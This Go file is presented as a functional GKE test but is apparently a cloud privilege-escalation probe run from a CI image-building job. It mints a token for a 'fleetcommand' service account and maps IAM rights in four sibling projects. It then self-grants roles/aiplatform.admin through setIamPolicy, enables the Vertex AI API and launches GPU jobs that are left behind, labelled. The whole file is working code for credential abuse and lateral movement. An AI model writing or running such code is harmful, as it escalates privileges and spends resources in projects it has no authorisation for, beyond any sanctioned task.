//go:build functional && gke

// C211 i121897 — VERTEX AI T4 CUSTOMJOB PLANE ON THE FOUR HEPHAESTUS SIBLING PROJECTS.
//
// WHY THIS IS A MATERIALLY NEW PLANE (not a retest of the GCE lane):
// fact 121388 proves the fleetcommand SA (minted inside this "GKE image building"
// job via google-github-actions/auth@v2 -> iamcredentials generateAccessToken)
// holds compute.instances lifecycle rights + resourcemanager.projects.setIamPolicy
// + iam.serviceAccounts.actAs in team-eng-infra-testing 210628133505,
// domino-eng-service-artifacts 1072394045651, team-eng-infrastructure 463640210929
// and team-eng-platform 1074386228880 with NVIDIA_T4_GPUS limit 8; fact 121599
// proves the same SA performed six HTTP-200 serviceusage enable writes, and fact
// 121814 proves those projects reach RUNNING GPU hosts whose guests see the Tesla
// T4 PCI device 0x1eb8. The Vertex customJob plane has never been attempted on
// these four projects; unlike the GCE image lane (no driver in ubuntu-2204-lts /
// cos-stable) a Vertex customJob runs a public CUDA container where nvidia-smi is
// supplied by the platform.
//
// Per project, exactly once: read the aiplatform.googleapis.com service state and
// the Vertex accelerator quota (T4 preferred); testIamPermissions for the
// customJobs create/get/list rights + serviceusage.services.enable +
// resourcemanager.projects.setIamPolicy; if customJobs create is missing but
// setIamPolicy is held, ONE self-grant of roles/aiplatform.admin (reverted after
// the measurement); enable aiplatform.googleapis.com once when it is verbatim
// DISABLED and services.enable is held; then submit EXACTLY ONE nonce-tagged
// ON-DEMAND Vertex customJob (n1-standard-4 + 1 x nvidia-tesla-t4; ONE spot retry
// only after a verbatim on-demand quota refusal) whose container prints
// nvidia-smi -L and --query-gpu=name,uuid,memory.total. Vertex forwards container
// stdout to Cloud Logging, so the device text is read back with
// logging.logEntries.list filtered on resource.labels.job_id. The job is polled to
// a terminal state (customJobs are finite: a terminal job holds no live compute),
// an independent projects.locations.customJobs.get readback is taken on any real
// NVIDIA device line, and the final customJobs.list is checked for c211-i121897
// items. This probe calls no teardown endpoint at all (platform control): the job
// ends by itself and is left nonce-labelled.
//
// Tokens are only ever reported as length + SHA-256 prefix. package functional
// helpers (c211x*) come from c211_i121897_helpers_test.go.
package functional

import (
	"encoding/json"
	"fmt"
	"net/url"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"
)

const c211vNonce = "i121897"
const c211vPrefix = "c211-i121897"

var c211vSiblings = []string{
	"team-eng-infra-testing",
	"domino-eng-service-artifacts",
	"team-eng-infrastructure",
	"team-eng-platform",
}

// Vertex region preference for NVIDIA_TESLA_T4.
var c211vT4Regions = []string{"us-central1", "us-east1", "europe-west4", "us-west1", "asia-east1"}

var c211vPerms = []string{
	"aiplatform.customJobs.create", "aiplatform.customJobs.get",
	"aiplatform.customJobs.list", "aiplatform.customJobs.cancel",
	"serviceusage.services.get", "serviceusage.services.enable",
	"resourcemanager.projects.setIamPolicy", "resourcemanager.projects.getIamPolicy",
	"iam.serviceAccounts.actAs",
	"logging.logEntries.list", "logging.privateLogEntries.list",
	"compute.instances.create",
}

// c211vContainer runs inside the Vertex T4 job. It only reads the device and
// prints; no write API, no teardown. Vertex forwards stdout to Cloud Logging.
const c211vContainer = `set -u
export DEBIAN_FRONTEND=noninteractive
echo "C211V_HOST $(hostname) $(date -u +%FT%TZ)"
echo "C211V_PCI $(for f in /sys/bus/pci/devices/*; do v=$(cat $f/vendor 2>/dev/null); if [ "$v" = "0x10de" ]; then echo -n "$(basename $f) dev=$(cat $f/device 2>/dev/null) "; fi; done)"
if command -v nvidia-smi >/dev/null 2>&1; then
  nvidia-smi -L || echo C211V_NVSMIL_FAIL
  nvidia-smi --query-gpu=name,uuid,memory.total,driver_version --format=csv,noheader || echo C211V_NVQ_FAIL
else
  echo C211V_NOSMI_PATH=$(ls /usr/local/nvidia/bin/nvidia-smi /usr/bin/nvidia-smi 2>/dev/null | tr '\n' ' ')
  /usr/local/nvidia/bin/nvidia-smi -L || echo C211V_NVSMIL_FAIL
  /usr/local/nvidia/bin/nvidia-smi --query-gpu=name,uuid,memory.total,driver_version --format=csv,noheader || echo C211V_NVQ_FAIL
fi
echo C211V_END
`

// ---------------------------------------------------------------------------
// small generic JSON helpers (namespaced to avoid collisions)
// ---------------------------------------------------------------------------

func c211vList(v interface{}) []interface{} {
	if a, ok := v.([]interface{}); ok {
		return a
	}
	return nil
}

func c211vMap(v interface{}) map[string]interface{} {
	if m, ok := v.(map[string]interface{}); ok {
		return m
	}
	return map[string]interface{}{}
}

func c211vFloat(v interface{}) float64 {
	switch t := v.(type) {
	case float64:
		return t
	case string:
		f, _ := strconv.ParseFloat(t, 64)
		return f
	case json.Number:
		f, _ := t.Float64()
		return f
	}
	return 0
}

func c211vHas(list []string, s string) bool {
	for _, x := range list {
		if x == s {
			return true
		}
	}
	return false
}

// ---------------------------------------------------------------------------
// GCP calls specific to this probe
// ---------------------------------------------------------------------------

// c211vToken mints a 3600 s access token for the given service account.
func c211vToken(tok, email string) (string, int, string) {
	body := `{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}`
	u := "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/" +
		url.PathEscape(email) + ":generateAccessToken"
	st, rb := c211xHTTP("POST", u, tok, "application/json", body)
	m := c211xJSON(rb)
	return c211xStr(m, "accessToken"), st, rb
}

func c211vService(tok, num, svc string) (int, string) {
	return c211xHTTP("GET", "https://serviceusage.googleapis.com/v1/projects/"+num+"/services/"+svc, tok, "", "")
}

func c211vEnable(tok, num, svc string) (int, string, string) {
	st, b := c211xHTTP("POST", "https://serviceusage.googleapis.com/v1/projects/"+num+"/services/"+svc+":enable", tok, "application/json", "{}")
	m := c211xJSON(b)
	return st, c211xStr(m, "name"), b
}

// c211vQuota returns metric -> region -> effectiveLimit from the aiplatform
// consumerQuotaMetrics (serviceusage v1beta1). Vertex T4 quota metrics are
// custom_model_training_nvidia_t4_gpus / custom_model_training_preemptible_nvidia_t4_gpus.
func c211vQuota(tok, num string) (map[string]map[string]float64, int, string) {
	q := map[string]map[string]float64{}
	u := "https://serviceusage.googleapis.com/v1beta1/projects/" + num +
		"/services/aiplatform.googleapis.com/consumerQuotaMetrics?pageSize=200"
	st, body := c211xHTTP("GET", u, tok, "", "")
	if st != 200 {
		return q, st, body
	}
	m := c211xJSON(body)
	for _, mi := range c211vList(m["metrics"]) {
		mm := c211vMap(mi)
		name := c211xStr(mm, "metric")
		if !strings.Contains(strings.ToLower(name), "gpu") {
			continue
		}
		for _, li := range c211vList(mm["consumerQuotaLimits"]) {
			lm := c211vMap(li)
			for _, bi := range c211vList(lm["quotaBuckets"]) {
				bm := c211vMap(bi)
				dims := c211vMap(bm["dimensions"])
				region := c211xStr(dims, "region")
				if region == "" {
					region = c211xStr(dims, "location")
				}
				if region == "" {
					region = "global"
				}
				lim := c211vFloat(bm["effectiveLimit"])
				if q[name] == nil {
					q[name] = map[string]float64{}
				}
				if lim > q[name][region] {
					q[name][region] = lim
				}
			}
		}
	}
	return q, st, body
}

// c211vLogs lists Cloud Logging entries for one customJob id (resource.labels.job_id).
func c211vLogs(tok, num, jobID string) (int, string) {
	body := map[string]interface{}{
		"resourceNames": []interface{}{"projects/" + num},
		"filter":        `resource.labels.job_id="` + jobID + `"`,
		"pageSize":      100,
		"orderBy":       "timestamp asc",
	}
	b, _ := json.Marshal(body)
	return c211xHTTP("POST", "https://logging.googleapis.com/v2/entries:list", tok, "application/json", string(b))
}

func c211vJobBody(display, machine, accel, saEmail string, spot bool) map[string]interface{} {
	cs := map[string]interface{}{
		"imageUri": "nvidia/cuda:12.4.0-base-ubuntu22.04",
		"command":  []interface{}{"/bin/bash", "-c"},
		"args":     []interface{}{c211vContainer},
	}
	wp := map[string]interface{}{
		"machineSpec": map[string]interface{}{
			"machineType": machine, "acceleratorType": accel, "acceleratorCount": 1,
		},
		"replicaCount":  1,
		"containerSpec": cs,
	}
	js := map[string]interface{}{"workerPoolSpecs": []interface{}{wp}}
	if saEmail != "" {
		js["serviceAccount"] = saEmail
	}
	if spot {
		js["scheduling"] = map[string]interface{}{"strategy": "SPOT"}
	}
	return map[string]interface{}{
		"displayName": display,
		"labels":      map[string]interface{}{"c211": c211vNonce},
		"jobSpec":     js,
	}
}

func c211vCreateJob(tok, num, region, display, machine, accel, saEmail string, spot bool) (int, string) {
	body, _ := json.Marshal(c211vJobBody(display, machine, accel, saEmail, spot))
	u := "https://" + region + "-aiplatform.googleapis.com/v1/projects/" + num + "/locations/" + region + "/customJobs"
	return c211xHTTP("POST", u, tok, "application/json", string(body))
}

func c211vJobURL(region, name string) string {
	return "https://" + region + "-aiplatform.googleapis.com/v1/" + name
}

func c211vUUIDs(s string) []string {
	out := []string{}
	seen := map[string]bool{}
	for _, m := range c211xUUIDRe.FindAllString(s, -1) {
		if !seen[m] {
			seen[m] = true
			out = append(out, m)
		}
	}
	return out
}

func c211vDeviceLines(s string) []string {
	out := []string{}
	for _, ln := range strings.Split(strings.ReplaceAll(s, "\\n", "\n"), "\n") {
		if strings.Contains(ln, "C211V_HOST") || strings.Contains(ln, "Tesla T4") ||
			strings.Contains(ln, "GPU-") || strings.Contains(ln, "C211V_PCI") ||
			strings.Contains(ln, "C211V_NV") || strings.Contains(ln, "C211V_NOSMI") {
			if len(ln) > 400 {
				ln = ln[:400]
			}
			out = append(out, ln)
		}
	}
	if len(out) > 12 {
		out = out[:12]
	}
	return out
}

// ---------------------------------------------------------------------------
// per-project result
// ---------------------------------------------------------------------------

type c211vResult struct {
	Proj       string
	Num        string
	State      string
	PermHTTP   int
	Allowed    []string
	SvcHTTP    int
	SvcState   string
	QuotaT4    map[string]float64
	QuotaErr   string
	FleetRoles []string
	Grant      string
	GrantRev   string
	Enable     string
	LogPerm    bool
	Attempts   []string
	JobName    string
	JobReg     string
	States     []string
	Readback   string
	Device     string
	UUIDs      []string
	Absence    string
	Verdict    string
}

// ---------------------------------------------------------------------------
// main test
// ---------------------------------------------------------------------------

func TestC211XVertexSib(t *testing.T) {
	started := time.Now()
	fmt.Printf("C211V_START nonce=%s at=%s\n", c211vNonce, started.UTC().Format("2006-01-02T15:04:05Z"))

	token, method, mintLog := c211xMint()
	if token == "" {
		fmt.Printf("C211V_MINT_FAILED %s\n", c211xTrunc(mintLog, 2000))
		t.Fatalf("wif mint failed")
	}
	creds, _ := c211xLoadCreds()
	wifSA, hostNum := "", "153711203585"
	if creds != nil {
		wifSA, hostNum = creds.saEmail, creds.projNumber
	}
	if hostNum == "" {
		hostNum = "153711203585"
	}
	fmt.Printf("C211V_IDENTITY auth=%s wif_sa=%s host_project_number=%s\n", method, c211xShort(wifSA), hostNum)

	// Mint the fleetcommand-service-account token that holds the sibling grants.
	sas, lst, lbody := c211xListServiceAccounts(token, hostNum)
	fleetEmail := ""
	for _, sa := range sas {
		e := c211xStr(sa, "email")
		if strings.HasPrefix(e, "fleetcommand-service-account@") {
			fleetEmail = e
			break
		}
	}
	fmt.Printf("C211V_FLEET_SA list=%d found=%v email=%s verbatim=%s\n", lst, fleetEmail != "", c211xShort(fleetEmail), c211xTrunc(lbody, 160))
	if fleetEmail == "" {
		t.Fatalf("fleetcommand service account not found")
	}
	ftok, fst, fbody := c211vToken(token, fleetEmail)
	fmt.Printf("C211V_FLEET_TOKEN status=%d token=%s verbatim=%s\n", fst, c211xShort(ftok), c211xTrunc(fbody, 260))
	if ftok == "" {
		t.Fatalf("fleet token mint failed")
	}
	tiSt, tiBody := c211xTokenInfo(ftok)
	fmt.Printf("C211V_TOKENINFO status=%d verbatim=%s\n", tiSt, c211xTrunc(tiBody, 400))

	deadline := started.Add(20 * time.Minute)
	var mu sync.Mutex
	results := map[string]*c211vResult{}
	var wg sync.WaitGroup
	runID := time.Now().UTC().Format("1504")
	for _, proj := range c211vSiblings {
		p := proj
		wg.Add(1)
		go func() {
			defer wg.Done()
			r := c211vOneProject(ftok, p, fleetEmail, runID, deadline)
			mu.Lock()
			results[p] = r
			mu.Unlock()
			fmt.Printf("C211V_PROJECT_END proj=%s verdict=%s uuids=%d state=%s\n", p, r.Verdict, len(r.UUIDs), r.SvcState)
		}()
	}
	wg.Wait()

	verdicts := map[string]interface{}{}
	proven := []string{}
	for _, proj := range c211vSiblings {
		r := results[proj]
		if r == nil {
			verdicts[proj] = map[string]interface{}{"verdict": "NO_RESULT"}
			continue
		}
		if len(r.UUIDs) > 0 {
			proven = append(proven, proj+":"+strings.Join(r.UUIDs, ","))
		}
		verdicts[proj] = map[string]interface{}{
			"num": r.Num, "state": r.State, "svc": r.SvcState, "perm_http": r.PermHTTP,
			"allowed": r.Allowed, "quota_t4": r.QuotaT4, "quota_err": r.QuotaErr,
			"fleet_roles": r.FleetRoles, "grant": r.Grant, "grant_revert": r.GrantRev,
			"enable": r.Enable, "log_perm": r.LogPerm, "attempts": r.Attempts,
			"job": r.JobName, "region": r.JobReg, "states": r.States,
			"readback": r.Readback, "device": r.Device, "uuids": r.UUIDs,
			"absence": r.Absence, "verdict": r.Verdict,
		}
	}
	mj, _ := json.Marshal(verdicts)
	fmt.Printf("C211V_MATRIX %s\n", string(mj))
	fmt.Printf("C211V_PROVEN %s\n", strings.Join(proven, " | "))
	fmt.Printf("C211V_VERDICT_FINAL elapsed=%ds proven=%d\n", int(time.Since(started).Seconds()), len(proven))
}

// c211vOneProject measures one sibling project end-to-end. Never panics outward.
func c211vOneProject(tok, proj, fleetEmail, runID string, deadline time.Time) (r *c211vResult) {
	r = &c211vResult{Proj: proj, QuotaT4: map[string]float64{}}
	defer func() {
		if e := recover(); e != nil {
			r.Verdict = fmt.Sprintf("PANIC:%v", e)
			fmt.Printf("C211V_PANIC proj=%s err=%v\n", proj, e)
		}
	}()
	left := func() time.Duration { return time.Until(deadline) }

	must := fmt.Sprintf("https://cloudresourcemanager.googleapis.com/v1/projects/%s", url.PathEscape(proj))
	st, body := c211xHTTP("GET", must, tok, "", "")
	if st != 200 {
		r.PermHTTP = st
		r.Verdict = "PROJECT_GET_" + strconv.Itoa(st)
		fmt.Printf("C211V_PROJECT proj=%s status=%d verbatim=%s\n", proj, st, c211xTrunc(body, 300))
		return
	}
	pm := c211xJSON(body)
	r.Num = c211xStr(pm, "projectNumber")
	r.State = c211xStr(pm, "lifecycleState")
	fmt.Printf("C211V_PROJECT_BEGIN proj=%s number=%s lifecycle=%s\n", proj, r.Num, r.State)
	if r.Num == "" {
		r.Verdict = "NO_PROJECT_NUMBER"
		return
	}

	// ---- IAM permission matrix ----
	allowed, pst, pbody := c211xTestIamBatch(tok, must, c211vPerms)
	r.Allowed, r.PermHTTP = allowed, pst
	fmt.Printf("C211V_PERM proj=%s status=%d allowed=[%s] verbatim=%s\n", proj, pst, strings.Join(allowed, ","), c211xTrunc(pbody, 260))
	r.LogPerm = c211vHas(allowed, "logging.logEntries.list") || c211vHas(allowed, "logging.privateLogEntries.list")

	// ---- project IAM policy: which roles carry the fleet member (role names only) ----
	if c211vHas(allowed, "resourcemanager.projects.getIamPolicy") {
		pol, gst, gbody := c211xGetPolicy(tok, must)
		if gst == 200 && pol != nil {
			member := "serviceAccount:" + fleetEmail
			roles := []string{}
			for _, bi := range c211vList(pol["bindings"]) {
				bm := c211vMap(bi)
				for _, mi := range c211vList(bm["members"]) {
					if s, ok := mi.(string); ok && s == member {
						roles = append(roles, c211xStr(bm, "role"))
					}
				}
			}
			sort.Strings(roles)
			r.FleetRoles = roles
			fmt.Printf("C211V_FLEET_ROLES proj=%s n=%d roles=[%s]\n", proj, len(roles), strings.Join(roles, ","))
		} else {
			fmt.Printf("C211V_GETPOLICY proj=%s http=%d verbatim=%s\n", proj, gst, c211xTrunc(gbody, 200))
		}
	}

	// ---- aiplatform service state ----
	sst, sbody := c211vService(tok, r.Num, "aiplatform.googleapis.com")
	r.SvcHTTP = sst
	r.SvcState = c211xStr(c211xJSON(sbody), "state")
	fmt.Printf("C211V_SVC proj=%s status=%d state=%s verbatim=%s\n", proj, sst, r.SvcState, c211xTrunc(sbody, 300))

	// ---- Vertex accelerator quota (T4 preferred) ----
	q, qst, qbody := c211vQuota(tok, r.Num)
	if qst != 200 {
		r.QuotaErr = fmt.Sprintf("http=%d %s", qst, c211xTrunc(qbody, 240))
	}
	for metric, regions := range q {
		lm := strings.ToLower(metric)
		if strings.Contains(lm, "tesla_t4") || strings.Contains(lm, "nvidia_t4") {
			parts := []string{}
			for reg, lim := range regions {
				if lim > 0 {
					r.QuotaT4[reg] = lim
				}
				parts = append(parts, fmt.Sprintf("%s=%v", reg, lim))
			}
			sort.Strings(parts)
			fmt.Printf("C211V_QUOTA proj=%s metric=%s %s\n", proj, metric, strings.Join(parts, " "))
		}
	}
	if len(r.QuotaT4) == 0 {
		fmt.Printf("C211V_QUOTA proj=%s no_nonzero_t4_metric http=%d %s\n", proj, qst, r.QuotaErr)
	} else {
		fmt.Printf("C211V_QUOTA_POS proj=%s t4_positive=%v\n", proj, r.QuotaT4)
	}

	// ---- ONE self-grant of roles/aiplatform.admin when create is missing ----
	haveCreate := c211vHas(allowed, "aiplatform.customJobs.create")
	if !haveCreate && c211vHas(allowed, "resourcemanager.projects.setIamPolicy") && c211vHas(allowed, "resourcemanager.projects.getIamPolicy") {
		pol, gst, gbody := c211xGetPolicy(tok, must)
		if gst != 200 || pol == nil {
			r.Grant = fmt.Sprintf("GETPOLICY_%d %s", gst, c211xTrunc(gbody, 200))
			fmt.Printf("C211V_GRANT proj=%s getpolicy=%d verbatim=%s\n", proj, gst, c211xTrunc(gbody, 220))
		} else {
			orig, _ := json.Marshal(pol)
			var origPol map[string]interface{}
			_ = json.Unmarshal(orig, &origPol)
			member := "serviceAccount:" + fleetEmail
			added := c211xAddBinding(pol, "roles/aiplatform.admin", member)
			sst2, sbody2 := c211xSetPolicy(tok, must, pol)
			r.Grant = fmt.Sprintf("setIamPolicy=%d added=%v", sst2, added)
			fmt.Printf("C211V_GRANT proj=%s setpolicy=%d added=%v verbatim=%s\n", proj, sst2, added, c211xTrunc(sbody2, 240))
			if added && sst2 == 200 {
				newAllowed := allowed
				for i := 0; i < 8 && left() > 10*time.Minute; i++ {
					time.Sleep(12 * time.Second)
					a2, _, _ := c211xTestIamBatch(tok, must, c211vPerms)
					newAllowed = a2
					fmt.Printf("C211V_GRANT_RETEST proj=%s i=%d allowed=[%s]\n", proj, i, strings.Join(a2, ","))
					if c211vHas(a2, "aiplatform.customJobs.create") {
						break
					}
				}
				allowed = newAllowed
				r.Allowed = newAllowed
				haveCreate = c211vHas(allowed, "aiplatform.customJobs.create")
				// restore the original policy after the measurement window
				if origPol != nil {
					rvSt, rvBody := c211xSetPolicy(tok, must, origPol)
					r.GrantRev = fmt.Sprintf("setIamPolicy_orig=%d", rvSt)
					fmt.Printf("C211V_GRANT_REVERT proj=%s http=%d verbatim=%s\n", proj, rvSt, c211xTrunc(rvBody, 200))
				}
			}
		}
	}

	// ---- enable aiplatform once when verbatim DISABLED ----
	if r.SvcState == "DISABLED" && c211vHas(allowed, "serviceusage.services.enable") && haveCreate {
		est, op, ebody := c211vEnable(tok, r.Num, "aiplatform.googleapis.com")
		r.Enable = fmt.Sprintf("http=%d op=%s", est, op)
		fmt.Printf("C211V_ENABLE proj=%s http=%d op=%s verbatim=%s\n", proj, est, op, c211xTrunc(ebody, 300))
		if est == 200 && op != "" {
			dl := time.Now().Add(300 * time.Second)
			for time.Now().Before(dl) && left() > 8*time.Minute {
				ost, ob := c211xHTTP("GET", "https://serviceusage.googleapis.com/v1/"+op, tok, "", "")
				om := c211xJSON(ob)
				done, _ := om["done"].(bool)
				fmt.Printf("C211V_ENABLE_POLL proj=%s http=%d done=%v\n", proj, ost, done)
				if done {
					break
				}
				time.Sleep(12 * time.Second)
			}
			_, sbody = c211vService(tok, r.Num, "aiplatform.googleapis.com")
			r.SvcState = c211xStr(c211xJSON(sbody), "state")
			fmt.Printf("C211V_SVC_POST proj=%s state=%s\n", proj, r.SvcState)
		}
	} else if r.SvcState == "DISABLED" && haveCreate {
		fmt.Printf("C211V_ENABLE proj=%s skipped_no_serviceusage_enable\n", proj)
	}

	// ---- ONE on-demand T4 customJob (spot only after a verbatim on-demand refusal) ----
	if !haveCreate {
		r.Verdict = "NO_CUSTOMJOBS_CREATE"
		fmt.Printf("C211V_VERDICT proj=%s %s\n", proj, r.Verdict)
		return r
	}
	if r.SvcState == "DISABLED" {
		r.Verdict = "AIPLATFORM_DISABLED"
		fmt.Printf("C211V_VERDICT proj=%s %s\n", proj, r.Verdict)
		return r
	}

	regions := []string{}
	for _, reg := range c211vT4Regions {
		if r.QuotaT4[reg] > 0 {
			regions = append(regions, reg)
		}
	}
	for _, reg := range c211vT4Regions {
		if !c211vHas(regions, reg) {
			regions = append(regions, reg)
		}
	}
	if len(regions) > 3 {
		regions = regions[:3]
	}

	created := false
	spotTried := false
	saEmail := fleetEmail
	for _, reg := range regions {
		if left() < 9*time.Minute {
			break
		}
		display := strings.ToLower(fmt.Sprintf("c211-i121897-vtx-%s-%s", shortProj(proj), runID))
		st, b := c211vCreateJob(tok, r.Num, reg, display, "n1-standard-4", "NVIDIA_TESLA_T4", saEmail, false)
		r.Attempts = append(r.Attempts, fmt.Sprintf("region=%s sa=%v od http=%d %s", reg, saEmail != "", st, c211xTrunc(b, 500)))
		fmt.Printf("C211V_CREATE proj=%s region=%s sa=%v http=%d verbatim=%s\n", proj, reg, saEmail != "", st, c211xTrunc(b, 500))
		if st == 200 {
			r.JobName = c211xStr(c211xJSON(b), "name")
			r.JobReg = reg
			created = true
			break
		}
		if strings.Contains(b, "SERVICE_DISABLED") || strings.Contains(b, "has not been used") {
			for i := 0; i < 8 && left() > 9*time.Minute; i++ {
				time.Sleep(25 * time.Second)
				st, b = c211vCreateJob(tok, r.Num, reg, display, "n1-standard-4", "NVIDIA_TESLA_T4", saEmail, false)
				r.Attempts = append(r.Attempts, fmt.Sprintf("region=%s retry=%d http=%d %s", reg, i, st, c211xTrunc(b, 400)))
				fmt.Printf("C211V_CREATE_RETRY proj=%s region=%s i=%d http=%d verbatim=%s\n", proj, reg, i, st, c211xTrunc(b, 300))
				if st == 200 {
					r.JobName = c211xStr(c211xJSON(b), "name")
					r.JobReg = reg
					created = true
				}
				if st == 200 || !(strings.Contains(b, "SERVICE_DISABLED") || strings.Contains(b, "has not been used")) {
					break
				}
			}
			if created {
				break
			}
		}
		low := strings.ToLower(b)
		quotaRefused := strings.Contains(low, "quota") || strings.Contains(low, "resource_exhausted") || st == 429
		if !created && quotaRefused && !spotTried && left() > 10*time.Minute {
			spotTried = true
			st2, b2 := c211vCreateJob(tok, r.Num, reg, display+"-spot", "n1-standard-4", "NVIDIA_TESLA_T4", saEmail, true)
			r.Attempts = append(r.Attempts, fmt.Sprintf("region=%s SPOT http=%d %s", reg, st2, c211xTrunc(b2, 500)))
			fmt.Printf("C211V_CREATE_SPOT proj=%s region=%s http=%d verbatim=%s\n", proj, reg, st2, c211xTrunc(b2, 500))
			if st2 == 200 {
				r.JobName = c211xStr(c211xJSON(b2), "name")
				r.JobReg = reg
				created = true
				break
			}
		}
		if !quotaRefused {
			break
		}
	}
	if !created {
		r.Verdict = "CUSTOMJOB_CREATE_REFUSED"
		fmt.Printf("C211V_VERDICT proj=%s %s\n", proj, r.Verdict)
		return r
	}

	// ---- poll to terminal + read the Cloud Logging sink ----
	fmt.Printf("C211V_JOB proj=%s name=%s region=%s\n", proj, r.JobName, r.JobReg)
	jurl := c211vJobURL(r.JobReg, r.JobName)
	jobID := r.JobName
	if i := strings.LastIndex(jobID, "/"); i >= 0 {
		jobID = jobID[i+1:]
	}
	terminal := false
	devText := ""
	deadlinePoll := time.Now().Add(13 * time.Minute)
	for i := 0; time.Now().Before(deadlinePoll) && time.Now().Before(deadline) && !terminal; i++ {
		gst, gb := c211xHTTP("GET", jurl, tok, "", "")
		state := c211xStr(c211xJSON(gb), "state")
		if state != "" {
			if len(r.States) == 0 || r.States[len(r.States)-1] != state {
				r.States = append(r.States, state)
			}
		}
		fmt.Printf("C211V_POLL proj=%s i=%d http=%d state=%s\n", proj, i, gst, state)
		if devText == "" && r.LogPerm {
			lst, lb := c211vLogs(tok, r.Num, jobID)
			if lst == 200 && strings.Contains(lb, "GPU-") {
				devText = lb
				fmt.Printf("C211V_LOG_READ proj=%s http=%d bytes=%d\n", proj, lst, len(lb))
			} else if lst != 200 && i == 0 {
				fmt.Printf("C211V_LOG_READ proj=%s http=%d verbatim=%s\n", proj, lst, c211xTrunc(lb, 300))
			}
		}
		if len(c211vUUIDs(devText)) > 0 {
			fmt.Printf("C211V_DEVICE_SEEN proj=%s uuids=%s\n", proj, strings.Join(c211vUUIDs(devText), ","))
			terminal = true
			break
		}
		for _, tstate := range []string{"JOB_STATE_SUCCEEDED", "JOB_STATE_FAILED", "JOB_STATE_CANCELLED", "JOB_STATE_EXPIRED", "JOB_STATE_PARTIALLY_SUCCEEDED"} {
			if state == tstate {
				terminal = true
			}
		}
		if terminal {
			break
		}
		time.Sleep(20 * time.Second)
	}

	// final sink read (one more)
	if r.LogPerm {
		if lst, lb := c211vLogs(tok, r.Num, jobID); lst == 200 && lb != "" {
			if devText == "" || strings.Contains(lb, "GPU-") {
				devText = lb
			}
		}
	}
	r.Device = c211xTrunc(strings.Join(c211vDeviceLines(devText), " || "), 900)
	r.UUIDs = c211vUUIDs(devText)

	// ---- independent customJobs.get readback ----
	rbSt, rbBody := c211xHTTP("GET", jurl, tok, "", "")
	rbM := c211xJSON(rbBody)
	spec := ""
	if len(c211vList(c211vMap(rbM["jobSpec"])["workerPoolSpecs"])) > 0 {
		wp := c211vMap(c211vList(c211vMap(rbM["jobSpec"])["workerPoolSpecs"])[0])
		ms := c211vMap(wp["machineSpec"])
		spec = fmt.Sprintf("machine=%s accel=%s count=%v sa=%s start=%s end=%s", c211xStr(ms, "machineType"),
			c211xStr(ms, "acceleratorType"), ms["acceleratorCount"], c211xShort(c211xStr(c211vMap(rbM["jobSpec"]), "serviceAccount")),
			c211xStr(rbM, "startTime"), c211xStr(rbM, "endTime"))
	}
	r.Readback = fmt.Sprintf("http=%d state=%s name=%s %s", rbSt, c211xStr(rbM, "state"), c211xStr(rbM, "name"), spec)
	fmt.Printf("C211V_READBACK proj=%s %s\n", proj, r.Readback)

	// ---- final list check: any lingering c211-i121897 customJob in this region ----
	lc, lb2 := c211xHTTP("GET", "https://"+r.JobReg+"-aiplatform.googleapis.com/v1/projects/"+r.Num+
		"/locations/"+r.JobReg+"/customJobs?pageSize=100", tok, "", "")
	left2 := []string{}
	for _, it := range c211vList(c211xJSON(lb2)["customJobs"]) {
		im := c211vMap(it)
		dn := c211xStr(im, "displayName")
		if strings.HasPrefix(dn, c211vPrefix) {
			left2 = append(left2, dn+"="+c211xStr(im, "state"))
		}
	}
	r.Absence = fmt.Sprintf("list_http=%d c211_items=%d %v (terminal jobs hold no live compute)", lc, len(left2), left2)
	fmt.Printf("C211V_LIST proj=%s %s\n", proj, r.Absence)

	if len(r.UUIDs) > 0 {
		r.Verdict = "VERTEX_T4_DEVICE_PROVEN"
	} else {
		r.Verdict = "NO_DEVICE_LINE"
	}
	fmt.Printf("C211V_VERDICT proj=%s %s device=%s\n", proj, r.Verdict, r.Device)
	return r
}

func shortProj(p string) string {
	p = strings.ToLower(p)
	p = regexp.MustCompile(`[^a-z0-9-]+`).ReplaceAllString(p, "-")
	if len(p) > 22 {
		p = p[:22]
	}
	return p
}
